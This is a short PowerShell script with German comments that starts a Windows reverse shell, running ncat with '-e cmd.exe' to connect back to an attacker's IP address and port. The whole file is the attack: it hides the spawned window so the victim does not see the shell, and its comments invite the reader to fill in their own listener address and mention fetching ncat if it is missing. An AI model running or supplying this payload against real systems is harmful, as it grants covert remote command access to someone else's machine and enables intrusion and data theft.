# Dieser PowerShell-Code startet eine CMD-Reverse-Shell.

# Definieren Sie die IP-Adresse und den Port Ihres Listeners.
# ERSETZEN SIE DIESE DURCH IHRE TATSÄCHLICHEN WERTE!
$ip = "192.168.2.127"  # Die IP-Adresse Ihres Angreifer-Rechners
$port = 124          # Der Port, auf dem Ihr Ncat-Listener läuft

# Überprüfen Sie, ob ncat.exe existiert. Wenn nicht, versuchen Sie Fallback oder Fehlermeldung.
# Dies ist eine einfache Prüfung. Bessere Skripte würden nach verschiedenen Pfaden suchen.
$ncat_path = "ncat.exe"
if (-not (Get-Command $ncat_path -ErrorAction SilentlyContinue)) {
    # Optional: Fügen Sie hier Code ein, um ncat herunterzuladen oder eine Fehlermeldung zu generieren.
    # Für diese Demonstration gehen wir davon aus, dass ncat.exe vorhanden ist.
    Write-Host "Ncat.exe wurde nicht gefunden. CMD-Reverse-Shell kann möglicherweise nicht gestartet werden."
    exit
}

# Starte eine CMD-Reverse-Shell mit ncat
# -e cmd.exe leitet die Standard-Ein-/Ausgabe von cmd.exe um.
$cmd_command = "$ncat_path $ip $port -e cmd.exe"

# Führe den ncat-Befehl über cmd.exe aus, versteckt und nicht interaktiv.
# Korrektur: -NoNewWindow entfernt, da es mit -WindowStyle Hidden in Konflikt steht.
Start-Process cmd.exe -WindowStyle Hidden -ArgumentList "/c", $cmd_command
